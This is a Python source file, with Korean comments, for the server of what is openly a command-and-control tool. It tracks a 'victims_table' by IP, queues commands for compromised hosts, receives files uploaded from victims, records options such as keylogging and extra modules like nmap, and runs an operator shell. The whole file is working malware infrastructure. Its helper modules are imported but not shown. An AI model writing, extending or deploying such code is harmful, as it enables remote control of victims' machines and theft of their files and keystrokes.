from http.server import HTTPServer, BaseHTTPRequestHandler
from collections import deque

from base_server import CNCBaseServer
from ddp import DDP, ERROR_CODE
from shell import EntryShell
from setting import *

import threading
import logging
import log_manager
import ssl

logger = logging.getLogger(LOGGER_NAME)

victims_table = {} # {ip : {index : [index num], command : [command queue], shCommand : [sh queue], seqName : [seqName queue], sendIndex : [file index]}}

class CNCServer(CNCBaseServer):
    victims_table = victims_table

    # ip가 테이블에 없으면 추가
    def _update_victim_tbl(self):

        if self.client_ip in victims_table:
            return
        
        victims_table[self.client_ip] = {
            'index' : str(len(victims_table)+1), 
            'command' : deque(), 
            'seq_name' : "",
            'sending_file' : "",
            'module' : set(), # nmap 등의 추가 모듈 install 여부
            'option' : {} # keylog on 등의 설정
        }
        # {ip : {index : [index num], command : [command queue], shCommand : [sh queue], seqName : [seqName queue], sendIndex : [file index]}}

    def do_GET(self):
        self._response_writer(b"This server isn't provide 'GET' method")

    def do_POST(self):
        # body가 dict 타입이 아니면 올바른 요청이 아님
        if not isinstance(self.body, dict):
            return self._response_error(ERROR_CODE.INVALID_HEADER_ERROR)
        
        # 접속 제한
        if self.client_ip not in self.victims_table and len(self.victims_table) >= LIMIT_CONNECTION:
            return self._response_error(ERROR_CODE.ACCESS_BLOCKED)

        self._update_victim_tbl() # 테이블 업데이트

        data = self.body['data']

        # sequence가 0이 아니라면 sequence 딕셔너리에 데이터 모으기
        if self.body['sequence'] != 0:
            if self._seq_handler(): # 반환 값이 True면 handler를 실행시킬 필요가 없음
                return
        elif self.body['type'] == 'FTP_RESPONSE' and self.body['sequence'] == 0:
            if not self._save_none_seq_file(data, self.victims_table[self.client_ip]['seq_name']):
                self._response_error(ERROR_CODE.FILE_ERROR)
                return

        # type에 따른 처리 함수 호출
        try:
            handler = getattr(self, "_handler_{}".format(self.body['type'].lower()))
            handler(data)
        except AttributeError as e:
            print(str(e))
            return self._response_error(ERROR_CODE.INVALID_HEADER_ERROR)
        except ConnectionResetError as e:
            # TODO log
            pass
        except BrokenPipeError as e:
            # TODO log
            pass
        

def server_open():
    try:
        httpd = HTTPServer(SERVER_INFO, CNCServer)
        """ case HTTPS
        httpd.socket = ssl.wrap_socket(httpd.socket,
                               server_side=True,
                               certfile='./resource/[cert path]',
                               ssl_version=ssl.PROTOCOL_TLS)
        """

        http_server_thread = threading.Thread(target=httpd.serve_forever)
        http_server_thread.daemon = True
        http_server_thread.start()

    except Exception as e:
        print('[!] HTTP Server Open Error / {}'.format(str(e)))
        exit(0)

if __name__ == '__main__':
    server_open()
    try:
        EntryShell(victims_table=victims_table).cmdloop()
    except KeyboardInterrupt:
        logger.info('server close')
        print()

        exit(0)
    except Exception as e:
        logger.error('Unknown error in main loop : {}'.format(e))